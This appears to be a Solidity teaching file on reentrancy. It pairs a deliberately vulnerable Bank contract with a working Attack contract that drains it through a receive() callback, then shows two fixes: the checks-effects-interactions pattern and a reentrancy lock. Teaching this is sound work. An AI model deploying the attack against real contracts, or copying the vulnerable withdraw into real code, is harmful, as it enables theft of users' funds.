// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.4;

contract Bank {
    mapping (address => uint256) public balanceOf;    // balance mapping

    // Deposit ether and update balance
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all ether of msg.sender
    function withdraw() external {
        // Get balance
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Transfer ether!!! May activate the fallback/receive function of a malicious contract, with the risk of re-entry!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // Update balance
        balanceOf[msg.sender] = 0;
    }

    // Get the balance of the bank contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; // Bank contract address

    // Initialize the Bank contract address
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // Callback function, used for re-entry attack on Bank contract, repeatedly calling the target’s withdraw function
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // Attack function, when called, set msg.value to 1 ether.
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Get the balance of this contract 
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Use the checks-effects-interaction pattern to prevent reentrancy attacks.
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Checks-effects-interaction pattern: first update the balance changes, then send ETH.
        // During a reentrancy attack, balanceOf[msg.sender] has already been updated to 0 and cannot pass the above check.
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Use a reentrancy lock to prevent reentrancy attacks.
contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    uint256 private _status; // Reentrancy lock 

    // Reentrancy lock
    modifier nonReentrant() {
        // When nonReentrant is called for the first time, _status will be 0.
        require(_status == 0, "ReentrancyGuard: reentrant call");
        // After this, any call to nonReentrant will fail
        _status = 1;
        _;
        // At the end of the call, restore _status to 0
        _status = 0;
    }


    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Use a reentrancy lock to protect vulnerable functions
    function withdraw() external nonReentrant{
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

